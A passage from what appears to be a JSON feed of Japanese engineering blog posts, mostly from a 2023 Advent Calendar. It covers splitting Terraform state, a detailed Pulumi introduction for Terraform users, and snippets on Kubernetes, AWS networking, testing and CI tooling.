Developer環境分離以外の分割をどうするか問題小さいサービスでは環境を分離するだけでだいたいは問題ないことがおおいですが、terraformを運用していると運用面、管理面でいろいろ課題が出てくると思います。管理するリソースが増えるとplan/applyの時間が増えたり、リソースの見通しが悪くなったりしてきます。特に実行時間が意外に馬鹿にできなかったりします。下手するとplanに数分かかるようになったりします。そのため、ある程度大きくなったらtrstateを分割して、リソースの管理範囲を分割する必要が出てきます。これをどうやって分割するかが自分の中で答えが出ていない出てないし、分脈によって解決策は異なるとは思います。ここで、解決策を考えるうえで、分割するための観点を見ていきましょう。分割する観点分割する観点は以下のようなものがあるかと思います。プロバイダー管理権限変更頻度プロバイダーで分割プロバイダー単位で分割するパターンです。例としてはAWSとDatadogのようにプロバイダーで分割します。プロバイダー間で依存がない場合は分けやすいかと思います。また、プロバイダー間で管理主体が違うことも多いので素直な分け方だとは思います。しかしながら、アプリケーションリソースとアプリケーションの監視を近いところにおいたほうが見通しがよいのではという観点もあるので運用体制にあわせて考えるとよいでしょう。管理権限で分割チームの権限で分割するパターンです。ただし、より堅くするなら、ディレクトリではなくレポジトリ自体も分割して、コードの参照権限も分割する方が望ましい場合もあります。例ネットワーク ⇒ インフラチームアプリケーション ⇒ 開発チーム変更頻度で分割変更をあまりしないリソースを変更が頻繁なリソースと一緒のplan/applyするのは無駄なので変更の頻度でtfstateを分割するパターンもあります。例変更が少ない ⇒ DB/ネットワーク変更が多い ⇒ EC2/ECS依存の方向性で分割少し観点を変えてみます。実際に分割をした場合に問題となるのはtfstate間のリソースの依存が課題になります。tfstate間で相互に依存するようなコードを書くとtarget指定してそれぞれのstateのリソースを作成しなくてはなりません。こうすると管理が煩雑となってしまうので、原則的に片方向だけの依存になるように分割するようにするのが望ましいです。tfstate間のリソース参照terraform_remote_state を使うことで、参照元のTerraformでoutputした内容を別のTerraformで利用することができます。# 参照元 networkアカウントoutput \\"vpc_id\\" {  value = aws_vpc.main.id}# 参照先 applicationアカウント# data.terraform_remote_state.network.vpc_id の形式でVPC IDを参照できるdata \\"terraform_remote_state\\" \\"network\\" {  backend = \\"s3\\"  config {    bucket = \\"terraform-tfstate-network-xxxxx\\"    key    = \\"tfstate\\"    region = \\"ap-northeast-1\\"  }}まとめ正直tfstateをどう扱うかに正解はないです。サービス規模や性質によって選択は変わります。本当に小さい規模であれば、tfstateを分割せず一つで十分でしょうし、チーム開発せず一人で扱うなら、通常であれば推奨されないtfstateのlocal git管理という手段がふさわしい場合もあります。また、組織やサービスの成長や時間経過によっても最適な選択は変わると思います。大事なのは選んだ技術要素に関しては選定理由を説明できるようにはしておくということです。選定理由及び不採用理由を明確にしておくことで、変更時に最適な選択の助けになるでしょう。","isoDate":"2023-12-22T15:00:00.000Z","dateMiliSeconds":1703257200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"testcontainers-scala で快適なインテグレーションテストを実現する","link":"https://zenn.dev/nomadblacky/articles/173ea1f829eafa","contentSnippet":"この記事は、3-shake Advent Calendar 2023 の 22 日目の記事です。 はじめに私の所属する株式会社スリーシェイクでは、Reckoner というデータパイプライン構築の SaaS を開発しています。https://reckoner.io/「SaaSをつなぐ。業務が変わる。ビジネスが進化する。」直感的なユーザーインターフェイスで、多種多様な SaaS のデータをつなぎ合わせることで、データ活用・データの民主化を実現します。 課題Reckoner では、データの取得・加工・保存部分を Scala で実装しており、データの連携先として、MySQL ...","isoDate":"2023-12-22T13:07:06.000Z","dateMiliSeconds":1703250426000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"AWS Network Firewall と NAT ゲートウェイの配置","link":"https://zenn.dev/toshikish/articles/d7d15cd01a8584","contentSnippet":"はじめにAWS Network Firewall（以下 NWFW）の導入例を探してアーキテクチャ図を眺めていると，説明されている図によって NAT ゲートウェイ（以下 NATGW）との配置がまちまちであることに気づきます。つまり，プライベート・パブリックサブネットのシンプルな構成の場合，インターネット宛ての通信経路は大別するとプライベートサブネット→ NATGW→ NWFW →インターネットプライベートサブネット→ NWFW → NATGW →インターネットの2種類が存在します。それぞれのアーキテクチャの違いと，どちらを選定すべきかの指針についてまとめます。 1....","isoDate":"2023-12-22T07:17:39.000Z","dateMiliSeconds":1703229459000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Kubernetesに対する理解を高めてKubernetesの「わからない」を減らそう","link":"https://speakerdeck.com/bells17/kubernetesnidui-suruli-jie-wogao-metekubernetesno-wakaranai-wojian-rasou","contentSnippet":"Kubernetes Novice Tokyo #29 で発表したLT資料です\\r\\rイベントURL: https://k8s-novice-jp.connpass.com/event/300438/\\r動画URL: https://www.youtube.com/watch?v=WZHDlB8P9_4\\r\\r参考資料:\\rhttps://github.com/kubernetes/kubernetes/tree/v1.28.4 \\rhttps://github.com/coredns/coredns/tree/v1.11.1 \\rhttps://github.com/coredns/example \\rhttps://github.com/coredns/coredns/blob/v1.11.1/plugin/kubernetes/README.md \\rhttps://github.com/kubernetes/dns/blob/1.22.28/docs/specification.md \\rhttps://github.com/kubernetes/cri-api/blob/v0.28.4/pkg/apis/runtime/v1/api.proto \\rhttps://coredns.io/2017/03/01/how-to-add-plugins-to-coredns/\\rhttps://coredns.io/2016/12/19/writing-plugins-for-coredns/ \\rhttps://github.com/coredns/example \\rhttps://github.com/coredns/coredns/blob/v1.11.1/plugin.md  \\r\\rセッション内容の詳しい資料:\\rhttps://bells17.booth.pm/items/3129761\\rhttps://bells17.booth.pm/items/2649601\\rhttps://speakerdeck.com/bells17/implementation-of-kubeadm-init\\rhttps://speakerdeck.com/bells17/kube-api-server-k8sjp\\rhttps://speakerdeck.com/bells17/kube-controller-managerru-men\\rhttps://speakerdeck.com/bells17/kube-proxyru-men\\rhttps://speakerdeck.com/bells17/kubernetestocorednsnituiteli-jie-suru\\rhttps://speakerdeck.com/bells17/cloud-controller-manager-deep-dive\\rhttps://speakerdeck.com/bells17/introduction-to-csi\\rhttps://speakerdeck.com/bells17/kubelet-and-containers\\rhttps://speakerdeck.com/bells17/cri-spec-and-dockershim-implementation","isoDate":"2023-12-21T05:00:00.000Z","dateMiliSeconds":1703134800000,"authorName":"bells17","authorId":"bells17"},{"title":"\uD83D\uDC19 KubernetesのマルチテナントパターンとArgoCDの実践テナント設計","link":"https://speakerdeck.com/hiroki_hasegawa/kubernetesnomarutitenantopatantoargocdnoshi-jian-tenantoshe-ji","contentSnippet":"『Kubernetes Novice Tokyo』の登壇資料です\\r\\r・Kubernetesのマルチテナントパターンの種類\\r・ArgoCDのAppProjectテナントとNamespacedスコープモード\\r・ArgoCDのテナントが防いでくれる誤った操作の具体例\\r\\rを紹介しました\\r\\rArgoCDのマニフェストの実装例を解説できませんでしたので、ぜひ元記事 (KubernetesのマルチテナントパターンとArgoCDの実践テナント設計) もご参照ください\uD83D\uDC4D\uD83C\uDFFB\\r\\r\uD83D\uDC26 ツイート：https://x.com/Hiroki__IT/status/1737778249021952458","isoDate":"2023-12-21T05:00:00.000Z","dateMiliSeconds":1703134800000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"【ArgoCD\uD83D\uDC19】\\"Kubernetes Novice Tokyo\\" に登壇","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/12/21/833414","contentSnippet":"発表スライドから得られる知識イベント名発表スライドから得られる知識発表スライドを見ると、以下を \\"完全に理解\\" できます✌️Kubernetesのマルチテナントパターンの種類ArgoCDのAppProjectテナントとNamespacedスコープモードArgoCDのテナントが防いでくれる誤った操作の具体例みんな！スライドぜってぇ見てくれよな！イベント名オッス！オラ長谷川！✋\uD83C\uDFFB『KubernetesのマルチテナントパターンとArgoCDの実践テナント設計』ていうテーマで、 Kubernetes Novice Tokyo に登壇したぞ！Kubernetes Novice Tokyo の登壇資料です！キミだけの最強のマルチテナントを作ろう✌️#k8snovicehttps://t.co/qNEhnkA7WZ— 長谷川 広樹 (地下強制労働者) (@Hiroki__IT) December 21, 2023 ちな、発表内容の詳細はこの記事をみてくれよな！","isoDate":"2023-12-21T03:00:00.000Z","dateMiliSeconds":1703127600000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"テーブル構造変更に伴う認可・権限管理を設計実装してみて思ったこと","link":"https://qiita.com/bayobayo0324/items/a2fcc5eee9930bd2009a","contentSnippet":"※この記事は3-shake Advent Calendar 2023の20日目の記事ですはじめまして、@bayobayo0324 です。株式会社スリーシェイクでクラウド型データ連携ツール「Reckoner（レコナー）」のプロダクトエンジニアしています。去年も書いていた...","isoDate":"2023-12-19T22:00:39.000Z","dateMiliSeconds":1703023239000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"terraform test: 細かい挙動","link":"https://zenn.dev/kyohei_saito/articles/eac62818b7217d","contentSnippet":"この記事は 3-shake Advent Calendar 2023 19 日目の記事です！ この記事に書いてあることこの記事を含め 3 回に渡って terraform test の機能を紹介します。terraform test: 基本機能terraform test: 応用機能terraform test: 細かい挙動 <- 今ここ はじめに前回の記事では、 terraform test の応用的な機能の紹介をしました。この記事では、 terraform test の挙動について説明します。 terraform test: 細かい挙動 state...","isoDate":"2023-12-18T14:58:00.000Z","dateMiliSeconds":1702911480000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"KubernetesとCoreDNSについて理解する","link":"https://speakerdeck.com/bells17/kubernetestocorednsnituiteli-jie-suru","contentSnippet":"3-shake SRE Tech Talk #8 で発表したLT資料です\\r\\rイベントURL: https://3-shake.connpass.com/event/302755/\\r動画URL: https://www.youtube.com/watch?v=8JbfniqxNQk\\r\\r参考資料:\\rhttps://github.com/kubernetes/kubernetes/tree/v1.28.4 \\rhttps://github.com/coredns/coredns/tree/v1.11.1 \\rhttps://github.com/coredns/example \\rhttps://github.com/coredns/coredns/blob/v1.11.1/plugin/kubernetes/README.md \\rhttps://github.com/kubernetes/dns/blob/1.22.28/docs/specification.md \\rhttps://github.com/kubernetes/cri-api/blob/v0.28.4/pkg/apis/runtime/v1/api.proto \\rhttps://coredns.io/2017/03/01/how-to-add-plugins-to-coredns/\\rhttps://coredns.io/2016/12/19/writing-plugins-for-coredns/ \\rhttps://github.com/coredns/example \\rhttps://github.com/coredns/coredns/blob/v1.11.1/plugin.md","isoDate":"2023-12-18T05:00:00.000Z","dateMiliSeconds":1702875600000,"authorName":"bells17","authorId":"bells17"},{"title":"2023-12-18 SRETT8 Terraform使いがPulumiに入門する","link":"https://speakerdeck.com/masasuzu/2023-12-18-srett8-terraformshi-ikapuluminiru-men-suru","contentSnippet":"","isoDate":"2023-12-18T05:00:00.000Z","dateMiliSeconds":1702875600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"terraform test: 応用機能","link":"https://zenn.dev/kyohei_saito/articles/52ce184522aae9","contentSnippet":"この記事は 3-shake Advent Calendar 2023 18 日目の記事です！ この記事に書いてあることこの記事を含め 3 回に渡って terraform test の機能を紹介します。terraform test: 基本機能terraform test: 応用機能 <- 今ここterraform test: 細かい挙動 はじめに前回の記事では、 terraform test の基本的な機能の紹介をしました。前回の記事の内容でも十分に terraform module のテストを書くことができると思います。しかし、今回紹介する応用的な機能を使...","isoDate":"2023-12-17T14:58:00.000Z","dateMiliSeconds":1702825080000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"個人開発で要件定義、設計をした話","link":"https://kechigon.hatenablog.com/entry/2023/12/17/142140","contentSnippet":"現在、個人開発で麻雀戦績管理アプリを作っていて、要件定義や設計について考えたことを共有したいと思います。GitHub ↓github.comなぜやったのか自分はWebエンジニアを目指している大学生ですが、まともなWebアプリを開発した経験がなく、フロントからインフラまでフルスタックで開発しようと思い立ちました。最初は何をするか手探りの状態でしたが、その「何をするのか」を定義するために要件定義、設計から始めました。何をやったのかGitHubにissueを作成し、やるべきことを明確化していきました。要件定義ここではアプリケーションの機能や、なぜそのような機能にするのかを箇条書きしていきます。この作業を通してやることとやらないことが明確化され、実装もうっすら浮かんできます。実際の要件定義は以下のような感じになりました。- ユーザーはまずサインアップする   - ユーザー名、パスワードを設定する      - ユーザー名は一意でないといけない   - ユーザの削除機能はデータ整合性が複雑になるので作らない - サインアップ済みのユーザーはログインをする   - ユーザー名、パスワードを入力- セッション管理をし、セッションが張られていたらログインを省略し、ユーザーホーム画面に入る。- 親ユーザーが部屋を作り、他のユーザーを登録していく   - 作成できる部屋は10部屋まで   - 親は参加のためのパスワードを設定する   - 子は親に部屋IDとパスワードを共有してもらう   - 3人以上いないと対局結果は登録できない、四麻は四人   - 部屋の削除機能も必要- 各部屋のホーム画面では各部屋での自分の戦績が表示される- オフラインで対局した点数結果とそのユーザーと何家かをアプリに登録する   - 点数結果だけでいいの？      - 毎回上がり役とかを登録してると、面倒くさいと思う   - 三麻も登録できるようにする。   - 点数の合計点を計算し、ユーザーの入力をチェックする   - 同点の場合は、東寄りが上位- 取り消し機能も必要   - 「対局」という粒度で削除できるようにする。これは点数とユーザを登録したひと塊。      - 間違えてもその「対局」を消し、また新しい「対局」を作ればいい - 自分または同じ部屋のユーザーの成績を確認できるようにする    - 平均順位   - 一位率   - 二位率   - 三位率   - 四位率   - とび率   - 対局数   - 平均得点   - 各項目のランキングも出す   - 「n局以上」で検索できるようにする- 対局の登録、削除のたびに個人成績を計算しなおすデータベース設計ER図を書きます。要件定義にあるように今回のアプリではユーザーのログイン機能や、そのユーザーが作成、参加する部屋、その部屋ごとの戦績など、テーブルが複雑にリレーションを張るので設計に入る前に整理することができます。ある程度機能を盛り込む予定の個人開発では必須でしょう。画面遷移画面遷移図を書きます。ページとその機能、ページ同士の遷移を定義します。ここで定義したことはすなわちユーザーアクションのすべてなので、ユーザーアクションごとのテストがしやすくなります。実際の画面遷移図↓以上のような要件定義、設計を行うことで、実装での手戻りが少なくなり、快適に実装ができました。これからアプリケーション自体はほとんど完成しているので、コンテナ化し、それをECSやCloud Runにデプロイし、運用していく予定です！","isoDate":"2023-12-17T05:21:40.000Z","dateMiliSeconds":1702790500000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"terraform test: 基本機能","link":"https://zenn.dev/kyohei_saito/articles/a32b5a11c81e97","contentSnippet":"この記事は 3-shake Advent Calendar 2023 17 日目の記事です！ この記事に書いてあることこの記事を含め 3 回に渡って terraform test の機能を紹介します。terraform test: 基本機能 <- 今ここterraform test: 応用機能terraform test: 細かい挙動 terraform test とはなにか 概要terraform test は Terraform module を実際に plan / apply して動作を確認するツールです。ドキュメントにも明記されている通り、主な使...","isoDate":"2023-12-16T14:58:00.000Z","dateMiliSeconds":1702738680000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"Terraform使いがPulumiに入門しました","link":"https://blog.masasuzu.net/entry/2023/12/16/000000","contentSnippet":"この記事は3-shake Advent Calendar 2023の16日目の記事です。qiita.comこの内容はSRETT #8で発表した内容に補足しています。3-shake.connpass.com    前提語らないことモチベーションPulumiとは対応言語PulumiのアーキテクチャPulumiのコンポーネントPulumi CloudPulumi Cloud 料金Pulumi操作方法PulumiインストールPulumi CloudへログインProjectの作成変更を確認Stackデプロイリソース削除state操作Terraformからの移行TerraformとPulumiを共存する(tfstateを参照)tfstateからインポートterraformからコード変換まとめ前提筆者は以下の背景を持っています。普段はAWSをメインに触っている普段はTerraformをメインで使ってるPulumiはプロダクションでは使ったことがないちゃんとは把握できてない語らないこと以下のようなPulumi以外の基本的なことは語りませんIaCとは概要、特徴、メリット・デメリットTerraformとは概要、特徴、メリット・デメリット、操作方法モチベーションなんでPulumiを今回調べようかと思った動機について書こうと思います。Terraformの記述力に限界を感じていたというところが大きいです。以下の点がつらいかなと思っていたところです。足りない関数二重ループのためのModule使用分岐処理のためのcountと三項演算子とはいえ、記述力が低いからこそ複雑なことを抑制できて可読性が上がっている面もあると思います。冗長でも、可読性が高いというのはメリットではあります。他の選択肢としては以下のものがあるかと思います。CDKAWSに限定されるCDKTF(CDK for Terraform)結局terraformのJSONコードに変換されるので、terraformに依存しますそれ自体は悪くないが、どうせならTerraformから離れたものを学びたいそこでなにか良いものがないかと思い当たったところにPulumiがあったので調べてみようとなりました。PulumiとはPulumiはプログラミング言語でインフラを構築可能なプロビジョニングツールです。Terraformと同じようにProviderを通して複数のクラウドに対応しています。TerraformはHCLという宣言的言語を使用するのに対し、Pulumiは汎用的なプログラミング言語を使用してインフラリソースを定義します。Pulumi - Infrastructure as Code in Any Programming Language対応言語TypeScript & JavaScript (Node.js)PythonGoC#, VB, F# (.NET)JavaPulumi YAML参考: Pulumi Languages & SDKs | Pulumi DocsPulumiのアーキテクチャ以下のようの構成になっています。参考: How Pulumi Works | Pulumi DocsLanguage hostインフラリソースの定義を Program (後述)として好きな言語で定義します。Deployment Engine希望する状態に変更するための操作セットを実行する役割を果たします。Resource Providerクラウドサービスとの通信を処理して、Programで定義したリソースの変更処理を行います。上記の例だと、Programにリソースの定義がある場合、Stateと比較して、管理されているリソースであるかを確認します。存在すれば、プロバイダーを通して実際のクラウドのリソースの状態と比較して差分があれば適用。存在しない場合、プロバイダーを通してリソースを作成。PulumiのコンポーネントWhat is Pulumi? | Pulumi DocsPulumiのコンポーネントは以下のようになっています。ProjectProgramのソースコードとメタデータ(Programの実行方法)を格納したディレクトリProgramインフラのあるべき姿を定義したものResourceインフラを構成するオブジェクト。ResourceのプロバティはOutputとして他のResourceのInputに使用することができますStackProgramを実行すると作成されるインスタンス。同一のProgramから開発、ステージング、本番環境のStackを個別に作成することができます。Pulumi CloudTerraform Cloudのようなものと考えていただいて良いです。デプロイの状態、履歴やシークレットを管理して、CI/CDやGitHubと連携してデプロイを実行することもできます。Pulumi CLIはバックエンドを明示的に指定しない限りはでデフォルトでPulumi Cloudを使用します。Terraformはデフォルトでlocalバックエンドを使用します。以下はPulumi Cloudの画面です。Pulumi Cloud 料金個人で使う限りは無料で使用することができます。※2023/12/18現在Pulumi操作方法ここからPulumiの操作方法を見て行きたいと思いますPulumiインストール個人的にはバージョン管理したいのでasdfでインストールします。brewでもインストールできます。# .tool-versionspulumi 3.97.0 asdf installPulumi CloudへログインデフォルトではPulumi Cloudへログインします。以下のコマンドを実行するとブラウザが起動するので、ログイン処理をします。pulumi loginPulumi Cloudを使わず、ローカルにstateを保存したい場合は以下のとおりです。pulumi logoutpulumi loign --localProjectの作成pulumi new コマンドで新しいProjectを作成できます。同時にStackも作成されます。引数にテンプレートを指定できます。ウィザード形式で設定をすることができます。以下の例は awsプロバイダーを使用して、言語はTypeScriptを使用するテンプレートとなります。ディレクトリ内にはPulumi実行に必要な各種ファイルが生成されます。ここで見るべきは以下の3ファイルです。Pulumi.yamlプロジェクト設定Pulumi.dev.yamlStack(dev)設定index.tsリソース定義# Pulumi.yamlname: sampleruntime: nodejsdescription: A minimal AWS TypeScript Pulumi program# Pulumi.dev.yamlconfig:aws:region: us-east-1// index.tsimport * as pulumi from \\"@pulumi/pulumi\\";import * as aws from \\"@pulumi/aws\\";import * as awsx from \\"@pulumi/awsx\\";// Create an AWS resource (S3 Bucket)const bucket = new aws.s3.Bucket(\\"my-bucket\\");// Export the name of the bucketexport const bucketName = bucket.id;変更を確認plumi preview コマンドでStackの変更差分を確認できます。 terraform plan を似ていますが、こちらは差分の詳細は表示されません。Stackデプロイpulumi up コマンドでStackをデプロイできます。 terraform plan と terraform apply を組み合わせた挙動になります。実行すると選択肢が出ます。details を選択すると変更差分の詳細が表示されます。yesを選択すると、変更が適用されます。リソース削除pulumi destroy でStackを削除できます。pulumi up と同じようにdetailsで詳細表示、 yes で削除実行ができますstate操作PulumiではStackごとにStateが保存されています。Stateを操作するコマンドは以下のとおりです。state出力(terraform state pull 相当 )pulumi stack exportstate インポート(terraform import相当)pululmi import <TYPE> <NAME> <ID>state 削除(terraform state rm 相当)pulumi state delete <URN>Terraformからの移行Terraformからの移行オプションは以下の通りとなります。terraformとPulumiを共存するPulumiからtfstateを参照するtfstateからリソースをPulumiへインポートするTerraformのコードをPulumiのコードに変換する参考: Adopting Pulumi | Pulumi Docs参考: Migrating from Terraform | Pulumi DocsTerraformとPulumiを共存する(tfstateを参照)networkリソースに関しては既存のterraformを使いつつ、そのoutputをPulumiで使うイメージになります。以下のようなコードでlocalのtfstateが参照できるので、値を参照して利用することができます。import * as aws from \\"@pulumi/aws\\";import * as terraform from \\"@pulumi/terraform\\";// Reference the Terraform state file:const networkState = new terraform.state.RemoteStateReference(\\"network\\", {    backendType: \\"local\\",    path: \\"/path/to/terraform.tfstate\\",});// Read the VPC and subnet IDs into variables:const vpcId = networkState.getOutput(\\"vpc_id\\");const publicSubnetIds = networkState.getOutput(\\"public_subnet_ids\\");// Now spin up servers in the first two subnets:for (let i = 0; i < 2; i++) {    new aws.ec2.Instance(`instance-${i}`, {        ami: \\"ami-7172b611\\",        instanceType: \\"t2.medium\\",        subnetId: publicSubnetIds[i],    });}tfstateからインポートpulumi import --from terraform ./terraform.tfstate のようにすることによってtfstateからリソースをインポートすることができます。terraformからコード変換pulumi convert --from terraform コマンドを使用することで、既存のTerraformのコードをPulumiのコードに変換することができます。ただし、変換できないコードはTODOコメントが付く。90%~95%は変換が対応しているとのこと。pulumi convert --from terraform --language typescriptまとめPulumiの概要と基本操作をTerraformと対比しながら説明してきました。新規プロジェクトである程度複雑な処理をしたい。プログラミング言語に精通している人がメンバーにいる。そういった場合にはPulumiは良さそうに思えます。しかしながら、ある程度Terraformで出来上がっているプロジェクトをPulumiに移行するのはそれなりに大変なので、プロジェクトの規模感とコストに見合うかを考えて導入するか考えると良いでしょう。また、複雑なことをしたいというのは、本当に必要とされていることなのでしょうか?冗長でも簡易的な書き方をした方が望ましい場合もあるかと思います。そのあたりの目利きをちゃんと考えたいところです。自分自身まだまだ使いこなせていないですし、追いきれてないPulumiのトピックもあるので、今後も選択肢の一つとして調べていきたいところです。","isoDate":"2023-12-15T15:00:00.000Z","dateMiliSeconds":1702652400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"sbt-github-acitons を使った CI の構築とプロジェクトの publish について","link":"https://zenn.dev/nomadblacky/articles/4c6a03aa5289c4","contentSnippet":"この記事は Scala Advent Calendar 2023 15日目 の記事です。 導入Scala プロジェクトを GitHub で開発する際には GitHub Actions を使用して CI を構築することが多いと思います。また、ライブラリの開発の場合は Maven Central に publish することも考えたいです。しかし、プロジェクトそれぞれに対応した GitHub Actions を構築するのは専門知識も必要で手間のかかる作業です。今回は sbt-github-actions という sbt プラグインを使用して、Scala プロジェクトの CI と ...","isoDate":"2023-12-15T03:00:00.000Z","dateMiliSeconds":1702609200000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"VPC エンドポイントポリシーで S3 バケットを制限する際の落とし穴","link":"https://zenn.dev/toshikish/articles/e846fa0c3de10f","contentSnippet":"状況設定AWS の VPC エンドポイントポリシーで VPC 内部から　Amazon S3 バケットへのアクセスを制限するために，以下のようなエンドポイントポリシーを設定するとします。s3-vpc-endpoint-policy.json{    \\"Version\\": \\"2012-10-17\\",    \\"Statement\\": [        {            \\"Effect\\": \\"Allow\\",            \\"Principal\\": \\"*\\",            \\"Action\\": \\"s3:*\\",            \\"Resource...","isoDate":"2023-12-14T22:00:00.000Z","dateMiliSeconds":1702591200000,"authorName":"toshikish","authorId":"toshikish"},{"title":"拝啓、CSSでドット絵を描きたくなったあの日(数週間前)の自分へ","link":"https://zenn.dev/nedoko_dok0dko/articles/c00b941f10501f","contentSnippet":"※ 3-shake Advent Calendar 2023の15日目のエントリー記事です。※ 12/21追記: CSS Advent Calendar 2023の21日目のエントリー記事として追加しました。投稿期間とズレてしまっていますが、CSSアドベントカレンダー盛り上がりの一助になればと思います。今年は数年離れていたデータエンジニアを再スタートし、データ基盤構築やGoogleCloudのProfessional試験を受けて合格したり…とテッキーな事に触れることが多い年でした。最近はDBやSRE領域に触れる機会もあり、自分の知識不足に凹みながらも「今は学ぶ時期だ」と1つずつ知識...","isoDate":"2023-12-14T15:31:58.000Z","dateMiliSeconds":1702567918000,"authorName":"seno","authorId":"seno"},{"title":"AWS Fault Injection Service で EKS の障害テストを行う","link":"https://zenn.dev/kyohei_saito/articles/6d1bcc1fe8610e","contentSnippet":"この記事は 3-shake Advent Calendar 2023 14 日目の記事です！ この記事に書いてあることこの記事では、AWS Fault Injection Service をつかって、EKS 上の Pod の障害テストを行う方法を説明します。この記事を書こうと思ったモチベーションとして、EKS 上のアプリケーションで障害テストをするために AWS Fault Injection Service (以降、「FIS」と記載します) を使用しようとしたところ、導入手順がいまいち分からなかったため、残しておこうと思ったためです。EC2 に障害を注入する場合は導入手順はシ...","isoDate":"2023-12-13T22:22:00.000Z","dateMiliSeconds":1702506120000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"[Kubernetes 1.27] Pod 停止時のフェーズ遷移の変更","link":"https://zenn.dev/toversus/articles/88ce2ea66b532d","contentSnippet":"Kubernetes 1.27 で KEP-3329: Retriable and non-retriable Pod failures for Jobs の一部として実装された [k/k#115331]: Give terminal phase correctly to all pods that will not be restarted により、Pod 停止時のフェーズが Running から Succeeded か Failed に遷移するようになりました。しかし、この変更が以下の予期せぬ問題を引き起こすことになります。[k/k#117018]: daemonset stuc...","isoDate":"2023-12-13T00:43:43.000Z","dateMiliSeconds":1702428223000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Unlocking Cloud Native Security","link":"https://speakerdeck.com/kyohmizu/unlocking-cloud-native-security","contentSnippet":"CloudNative Days Tokyo 2023 の登壇資料です。2023/12/12\\rhttps://event.cloudnativedays.jp/cndt2023","isoDate":"2023-12-12T05:00:00.000Z","dateMiliSeconds":1702357200000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Helmfile でちょっとしたリソースを追加したい","link":"https://zenn.dev/toshikish/articles/5ead548816e618","contentSnippet":"動機Helmfile で公式のチャートをインストールしていて，追加で関連リソースを追加したいことがあります。関連リソースの数が多い，内容が環境によって変わるなどの場合は，カスタムチャートを追加することになるでしょう。ただ，そこまで複雑ではない，関連リソースが数個レベルの場合，カスタムチャートだと大げさに感じることがあります。そこでどうすべきか迷っていたところ，同僚の toVersus さんに別の方法を教えていただきました。 extraTemplates 系の変数を使うHelm チャートによっては extraTemplates や extraObjects といった変数が...","isoDate":"2023-12-11T10:57:21.000Z","dateMiliSeconds":1702292241000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Amazon S3 バケットの terraform destroy に注意","link":"https://zenn.dev/toshikish/articles/190fe076cc63f4","contentSnippet":"TL;DRAmazon S3 バケットを削除する前には，必ずすべてのオブジェクトを削除しよう。aws_s3_bucket リソースの force_destroy 引数 を true にしてもよい。terraform destroy で削除すると，パブリックアクセスできる旨のアラートが出る場合があるので注意しよう。aws_s3_bucket_public_access_block リソースを terraform state rm するとアラートが出ない。マネジメントコンソールから削除してもアラートは出ない。 S3 バケットの terraform dest...","isoDate":"2023-12-11T09:03:06.000Z","dateMiliSeconds":1702285386000,"authorName":"toshikish","authorId":"toshikish"},{"title":"sqldefとpgrollを利用したPostgreSQLでのスキーマブルーグリーンデプロイメント","link":"https://zenn.dev/nnaka2992/articles/blue_grean_on_postgres_with_sqldeff_and_pgroll","contentSnippet":"この記事はこのエントリー以下のアドベントカレンダーの11日目の記事です。3-shake Advent Calendar 2023昨日はtoyb0xによるTODOコメントをチケット管理するためのESLint Custom Ruleでした。PostgreSQL Advent Calendar 2023昨日は@ozozatyによるPostgreSQLのjsonb型でJSONパス式(JSONPath)を使うでした。 はじめにPostgreSQLではDDLはその性質からテーブルレベルでロックを取得してしまいます。SREやPlatform EngineeringなどDev...","isoDate":"2023-12-10T23:30:00.000Z","dateMiliSeconds":1702251000000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"GitLab CIでKICSを実行する","link":"https://zenn.dev/tayusa/articles/d28865c5ce49c6","contentSnippet":"やることTerraformの静的解析を行うKICSの結果をgitlab-commentでMRに出力するhttps://github.com/yuyaban/gitlab-commentKICSの結果を基にMRにReviewdogで指摘するhttps://github.com/reviewdog/reviewdog KICSの実行$ kics scan --config kics.yamlkics.yamlpath: \\".\\" # 解析するTerraformの場所output-path: \\".\\" # 結果の出力先report-formats:...","isoDate":"2023-12-10T00:00:00.000Z","dateMiliSeconds":1702166400000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Golangでk8s Deploymentを再起動させる","link":"https://zenn.dev/tayusa/articles/a7df40b7d6fd5b","contentSnippet":"やることclient-goを使って複数のDeploymentを同時に再起動させる Golang Deploymentの取得Pod内であればrest.InClusterConfig()でPodのServiceAccountを使用するconfigを取得できるclientset.AppsV1().Deployments(namespace).Get(ctx, deploymentName, metav1.GetOptions{}) でDeploymentを取得NamespaceとDeploymentの名前が必要k8s.gopackage maini...","isoDate":"2023-12-10T00:00:00.000Z","dateMiliSeconds":1702166400000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"TypeScript で LangChain の最初の一歩","link":"https://zenn.dev/satohjohn/articles/9415f85be332e6","contentSnippet":"このエントリーは 3-shake Advent Calendar 2023 の10日目の記事です。今年は Python をガッツリ触ったり、 LLM などの方面に手を出してきており、新しいことにまみれております。その中で LLM のシステム作るんだったら Python だろ？っていう中で TypeScript でもちゃんとできるよーっていうことで紹介していきたいと思います。 私が、あんまり Python でアプリ作っていくのが好きじゃないのもありますもちろん、 Python よりも TypeScript のほうが機能が少なめではありますので、そのあたりは、目をつぶっております。今...","isoDate":"2023-12-09T15:00:00.000Z","dateMiliSeconds":1702134000000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"今よりちょっとだけ上手く文章を書くコツ","link":"https://qiita.com/kojake_300/items/c5def031a252323fae1c","contentSnippet":"この記事は、3-shake Advent Calendar 2023 